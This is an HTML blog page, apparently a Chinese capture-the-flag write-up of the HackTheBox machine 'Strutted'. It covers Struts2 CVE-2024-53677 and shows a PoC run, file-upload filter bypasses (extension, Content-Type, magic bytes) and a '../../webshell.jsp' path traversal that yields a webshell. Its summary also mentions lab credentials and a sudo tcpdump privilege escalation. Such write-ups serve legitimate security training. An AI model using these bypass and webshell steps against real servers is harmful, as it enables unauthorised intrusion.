@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Strutted​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;644 首先使用 nmap 進行掃描，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Strutted">
+<meta property="og:url" content="https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Strutted​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;644 首先使用 nmap 進行掃描，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093706-u55aikb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124081212-3eifk7y.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124090850-tlpulzo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091407-mgwcnzt.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091349-64p7qgx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124084350-mvi05r1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124084552-3mha0ti.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091018-bzdxkhv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091107-utlts4m.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091139-d8duwvk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091213-yx4jdkl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091526-nfq0041.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091719-qm8fd5g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091734-jqkrjmc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091840-r7e4xwd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091938-iyj1gde.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092016-n3cqezb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092057-uy7ij3z.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092114-qsqtdza.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092231-wi119vr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092241-q1qsj2u.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124100735-26zyez4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092326-pm3zppk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092345-xyhec73.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092415-mgzei5e.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092458-yhhbsqw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092528-cxecjjh.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092616-lisv9qd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093044-9i0a6lx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093335-hknv3jw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093351-649mu3p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093421-f6l0u3t.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093450-noe559w.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124101334-lpp07z2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093651-zk2mfnl.png">
+<meta property="article:published_time" content="2025-01-24T02:24:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T02:27:02.816Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093706-u55aikb.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Strutted</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/22/2025/18-hackthebox-Backfire/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&text=HackTheBox - Machine - Strutted"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&is_video=false&description=HackTheBox - Machine - Strutted"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Strutted&body=Check out this article: https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&title=HackTheBox - Machine - Strutted"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&name=HackTheBox - Machine - Strutted&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/24/2025/19-hackthebox-Strutted/&t=HackTheBox - Machine - Strutted"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Strutted
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-24T02:24:00.000Z" class="dt-published" itemprop="datePublished">2025-01-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Strutted"><a href="#Strutted" class="headerlink" title="Strutted"></a>Strutted</h1><p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124093706-u55aikb.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/achievement/machine/463126/644">https://www.hackthebox.com/achievement/machine/463126/644</a></p>
+<p>首先使用 nmap 進行掃描，發現目標網站跳轉至 <a target="_blank" rel="noopener" href="http://strutted.htb/">http://strutted.htb/</a> ，接著進行子域名掃描卻未獲得任何結果。進入網站後，發現右上角有一個下載按鈕，點擊後下載了源碼，並在解壓後找到了一組帳號密碼。儘管嘗試使用 SSH 登錄，但未能成功。透過網頁上傳一張圖片並使用 burp 代理截取請求，發現服務器返回了 200 狀態碼，但網頁上顯示錯誤。由於機器名稱與 Tomcat 名稱相同，開始查找相關的漏洞，發現 CVE-2024-53677 和 CVE-2023-50164，隨後嘗試利用 CVE-2024-53677 的漏洞。下載了相應的 PoC，但執行後僅顯示上傳成功，實際上並未達成目的。進一步分析發現，雖然服務器返回 200，但並未真正成功上傳。接著使用 burp 代理截取請求，發現服務器不允許後綴名為 JSP 的文件上傳，於是嘗試將文件後綴改為 JPG，結果繞過了檢查，但又出現了新的錯誤。深入源碼後，了解到了 isAllowedContentType 函數的檢查邏輯，進而修改為 image&#x2F;png 繞過檢查，但又遭遇另一個錯誤。繼續追蹤後，發現 isImageByMagicBytes 函數負責檢查文件的魔術字節，因此重新上傳一個 PNG 文件並複製其魔術字節後成功上傳，最終獲得了 JSP 文件的訪問權限。透過修改文件名為 ..&#x2F;..&#x2F;webshell.jsp，成功獲得了一個 webshell，並在獲得 shell 後發現當前用戶為 Tomcat。進一步檢查發現 Dockerfile，推測當前運行於容器中，隨後查看 &#x2F;etc&#x2F;passwd，發現有一個名為 james 的用戶。透過枚舉 Tomcat 的配置文件，找到了一個後台密碼 IT14d6SSP81k，並嘗試使用 SSH 登錄，成功獲得 user.txt。在獲得用戶權限後，檢查 sudo -l，發現可以以 root 身份運行 &#x2F;usr&#x2F;sbin&#x2F;tcpdump，隨後參考 gtfobins 的文檔，將 COMMAND 修改為 bash 並設置 SUID，最終成功獲得 root 權限，完成了整個滲透過程。</p>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>首先 nmap 掃描一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     syn-ack ttl <span class="number">63</span> OpenSSH <span class="number">8.9</span>p1 Ubuntu 3ubuntu0<span class="number">.10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   <span class="number">256</span> 3e:ea:<span class="number">45</span>:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=</span><br><span class="line">|   <span class="number">256</span> <span class="number">64</span>:cc:<span class="number">75</span>:de:4a:e6:a5:b4:<span class="number">73</span>:eb:3f:1b:cf:b4:e3:<span class="number">94</span> (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http    syn-ack ttl <span class="number">63</span> nginx <span class="number">1.18</span><span class="number">.0</span> (Ubuntu)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did <span class="keyword">not</span> follow redirect to http://strutted.htb/</span><br><span class="line">|_http-server-header: nginx/<span class="number">1.18</span><span class="number">.0</span> (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>看到他會跳轉到 <code>http://strutted.htb/</code>​ ，所以直接掃一下子域名，什麽也沒有。</p>
+<h1 id="Analysis-source-code-for-webserver"><a href="#Analysis-source-code-for-webserver" class="headerlink" title="Analysis source code for webserver"></a>Analysis source code for webserver</h1><p>打開 <code>http://strutted.htb/</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124081212-3eifk7y.png" alt="image">​</p>
+<p>右上角有一個下載按鈕，點下去就直接下載源碼，解壓後看到有一個賬號密碼在裏面：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124090850-tlpulzo.png" alt="image">​</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;tomcat-users&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;user username=<span class="string">&quot;admin&quot;</span> password=<span class="string">&quot;skqKY6360z!Y&quot;</span> roles=<span class="string">&quot;manager-gui,admin-gui&quot;</span>/&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不過試了一下 ssh 什麽的，沒有用。</p>
+<h2 id="Searching-struts2-Exploit"><a href="#Searching-struts2-Exploit" class="headerlink" title="Searching struts2 Exploit"></a>Searching struts2 Exploit</h2><p>在網頁上隨便上傳一張圖片，使用 burp 截取一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091407-mgwcnzt.png" alt="image">​</p>
+<p>看到服務器返回200，但是錯誤顯示在網頁上：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091349-64p7qgx.png" alt="image">​​​</p>
+<p>既然機器的名字和tomcat 的名字相同，就去查一下相關的包：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124084350-mvi05r1.png" alt="image">​</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;struts2.version&gt;<span class="number">6.3</span><span class="number">.0</span><span class="number">.1</span>&lt;/struts2.version&gt;</span><br></pre></td></tr></table></figure>
+
+<p>網上搜一下 exploit ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124084552-3mha0ti.png" alt="image">​</p>
+<p>看到 CVE-2024-53677和 CVE-2023-50164。先嘗試第一個CVE-2024-53677，直接搜索poc看到：<a target="_blank" rel="noopener" href="https://github.com/EQSTLab/CVE-2024-53677">https://github.com/EQSTLab/CVE-2024-53677</a></p>
+<p>在這個 CVE 的介紹中寫了一句話：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091018-bzdxkhv.png" alt="image">​</p>
+<p>儅有重複的 <code>content-desposition</code>​ 時，最下面的就會覆蓋掉最上面的名字，就可以寫入任意目錄。</p>
+<h2 id="Exploit-struts2-with-CVE-2024-53677"><a href="#Exploit-struts2-with-CVE-2024-53677" class="headerlink" title="Exploit struts2 with CVE-2024-53677"></a>Exploit struts2 with CVE-2024-53677</h2><p>所以把 poc 下載下來試試看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/EQSTLab/CVE-<span class="number">2024</span>-<span class="number">53677.</span>git</span><br><span class="line">$ python3 CVE-<span class="number">2024</span>-<span class="number">53677.</span>py  --url  http://strutted.htb/upload.action -p webshell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091107-utlts4m.png" alt="image">​</p>
+<p>直接運行后顯示上傳成功，但是什麽事情也沒有發生，輸出日志中看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091139-d8duwvk.png" alt="image">​</p>
+<p>從上面中的錯誤可以得知根本就沒有成功。</p>
+<h3 id="Use-burp-to-intercept-requests"><a href="#Use-burp-to-intercept-requests" class="headerlink" title="Use burp to intercept requests"></a>Use burp to intercept requests</h3><p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091213-yx4jdkl.png" alt="image">​</p>
+<p>上傳成功是因爲服務器返回了200狀態碼。</p>
+<p>所以加一個 burp 的代理，然後用 burp 截取一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091526-nfq0041.png" alt="image">​</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">myproxy = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span> : <span class="string">&quot;127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span> : <span class="string">&quot;127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(self.url, files=files, proxies=myproxy, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>從 burp 截取到的請求可以看到他是使用 jsp 發送出去的，然而服務器不允許後綴名是 jsp：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091719-qm8fd5g.png" alt="image">​</p>
+<p>如果改成jpg試試看，結果繞過了後綴名，出現了另一個錯誤：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091734-jqkrjmc.png" alt="image">​</p>
+<p>所以根據錯誤信息搜索了一下源碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091840-r7e4xwd.png" alt="image">​</p>
+<p>看到它來自 <code>isAllowedContentType</code>​這個函數，跟進去裏面看到原來他會判斷 http 頭：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124091938-iyj1gde.png" alt="image">​</p>
+<p>所以改成 <code>image/png</code>​就可以繞過了，但是又出現了另一個錯誤：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092016-n3cqezb.png" alt="image">​</p>
+<p>繼續跟進去后發現它來自 <code>isImageByMagicBytes</code>​這個函數：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092057-uy7ij3z.png" alt="image">​</p>
+<p>從名字中也可以知道他會檢查上傳文件頭幾個字節：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092114-qsqtdza.png" alt="image">​</p>
+<p>既然是這樣那我重新上傳一個 png，然後使用burp截取，再把文件頭複製過去看看會發生什麽：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092231-wi119vr.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092241-q1qsj2u.png" alt="image">​</p>
+<p>因爲魔術字節是16進制而不是 ascii 碼的，burp 可以直接選中PNG這塊區域，然後複製過去：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124100735-26zyez4.png" alt="image">​</p>
+<p>這樣一些魔術字節也會複製過來，發送之後顯示上傳成功了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092326-pm3zppk.png" alt="image">​</p>
+<p>在請求回來的html中可以看到後綴是 jsp 格式的，也就成功了一半：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092345-xyhec73.png" alt="image">​</p>
+<h3 id="JSP-File-upload-success-and-Trying-to-upload-to-a-different-location-got-web-shell"><a href="#JSP-File-upload-success-and-Trying-to-upload-to-a-different-location-got-web-shell" class="headerlink" title="JSP File upload success and Trying to upload to a different location got web shell"></a>JSP File upload success and Trying to upload to a different location got web shell</h3><p>既然上傳成功了，那就直接訪問看看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://strutted.htb/uploads/<span class="number">20250124_012315</span>/webshell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092415-mgzei5e.png" alt="image">​</p>
+<p>很明顯 jsp 的内容沒有被解析，所以猜測 <code>uploads</code>​ 目錄下不會解析 <code>jsp</code>​文件，既然是這樣嘗試把名字改成  <code>../../webshell.jsp</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/19-htb-Strutted/image-20250124092458-yhhbsqw.png" alt="image">​</p>
+<p>訪問一下之後看到成功的解析了jsp：</p>
